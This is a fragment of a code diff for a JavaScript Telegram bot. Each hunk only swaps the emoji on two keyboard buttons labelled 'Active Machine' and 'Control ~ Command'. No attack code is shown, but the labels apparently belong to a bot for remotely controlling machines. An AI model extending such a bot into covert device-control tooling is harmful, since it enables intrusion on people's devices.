-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -576,7 +576,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -595,7 +595,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -614,7 +614,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -633,7 +633,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -652,7 +652,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
